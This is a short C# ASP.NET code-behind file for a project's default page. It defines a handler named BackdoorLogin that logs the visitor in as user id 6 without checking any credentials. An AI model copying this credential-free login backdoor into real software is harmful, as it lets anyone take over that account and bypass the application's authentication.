using MasterBox.Auth;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace MasterBox
{
    public partial class _Default : Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

		protected void BackdoorLogin(object sender, EventArgs e) {
			User usr = Auth.User.GetUser(6);
			MBProvider.Instance.LoginSuccess(usr, true);
		}
	}
}